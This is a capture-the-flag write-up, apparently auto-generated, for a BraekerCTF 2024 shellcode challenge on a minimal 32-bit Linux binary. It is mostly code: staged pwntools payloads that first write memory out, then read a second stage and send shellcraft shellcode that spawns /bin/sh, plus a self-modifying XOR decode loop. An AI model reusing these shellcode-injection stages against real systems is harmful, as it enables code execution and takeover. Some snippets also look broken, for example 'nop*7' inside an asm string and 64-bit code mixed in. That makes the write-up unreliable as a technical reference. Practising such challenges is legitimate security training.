---
title: BraekerCTF 2024 Writeup
contest: BraekerCTF
year: 2024
difficulty: medium
vuln_type: pwn_unknown
tags: [32位 Linux, sys_read shellcode, add al [eax], add eax [eax], add [eax] eax, pop ecx, jmp ecx, execve /bin/sh, download.elf, vlun _start, binary_shrink XOR 0x42, self-modifying]
attack_chain:
  - vlun: sys_read(0, ecx, 0x18) + add al,[eax] + add eax,[eax] + add [eax],eax
  - _start: call vlun + xor al, 0
  - 利用: nop nop nop nop + mov eax,4 + mov ebx,1 + int 0x80 + jmp ecx
  - 高级: nop×7 + mov al,0x3 + add ecx,0x12 + mov dl,0x7f + int 0x80 + jmp ecx
  - 注入 shellcode: execve /bin///sh via pwntools shellcraft
  - binary_shrink: pop rdx + mov rax,rdx + jmp second + add rdx,0x91 + sub rax,0xe
  - mov rsi,rax + mov cl,0x56 + loop: xor [rdx],sil + xor [rdx],0x42 + inc rdx + inc rax + loop
  - 自修改代码 + XOR 0x42 还原
key_payload: 'sys_read 0x18 字节 / add al [eax] / jmp ecx / nop×4 + write(1, ecx) / nop×7 + sys_read 0x7f / execve /bin/sh / binary_shrink XOR 0x42 loop 0x56'
one_liner: BraekerCTF 2024 — 32位 Linux shellcode: sys_read 0x18 字节 + add al,[eax] 链 + nop+write+int 0x80+jmp ecx + nop×7+sys_read 0x7f + execve /bin/sh + binary_shrink 自修改 XOR 0x42。
lesson: 极简 shellcode 注入常需要多次拼接;jmp ecx 是最简 shellcode 入口;自修改代码 + XOR 是 anti-disassemble 经典。
quality: high
---

# BraekerCTF 2024 Writeup

## 速读
BraekerCTF 2024 — 32位 Linux 极简 shellcode 注入 + 自修改代码。

## vlun 入口
```nasm
section .text
global _start

vlun:
    mov eax, 3           ; sys_read
    mov ebx, 0           ; fd=0 (stdin)
    pop ecx              ; return addr (栈顶)
    xor cl, cl           ; 高位清零
    mov edx, 0x18        ; 0x18 字节
    int 0x80             ; syscall
    add al, [eax]        ; 修改 al
    add eax, [eax]       ; 修改 eax
    add [eax], eax       ; 修改 [eax]

_start:
    call vlun
    xor al, 0
```

## 注入 1: write(1, ecx)
```python
payload = asm("""
    nop
    nop
    nop
    nop
    mov eax, 4
    mov ebx, 1
    int 0x80
    jmp ecx
""")
```

## 注入 2: read(0, ecx+0x12, 0x7f) + execve
```python
payload = asm("""
    nop*7
    mov al, 0x3
    add ecx, 0x12
    mov dl, 0x7f
    int 0x80
    jmp ecx
""")

shellcode = asm(shellcraft.sh())  # execve /bin///sh
p.send(payload)
p.send(shellcode)
```

## binary_shrink 自修改
```nasm
first:
    pop rdx
    mov rax, rdx
    jmp second

second:
    add rdx, 0x91
    sub rax, 0xe
    mov rsi, rax
    xor ecx, ecx
    mov cl, 0x56
    mov rax, rsi

point:
    mov sil, [rax]
    xor [rdx], sil
    xor [rdx], 0x42
    inc rdx
    inc rax
    loop point
```
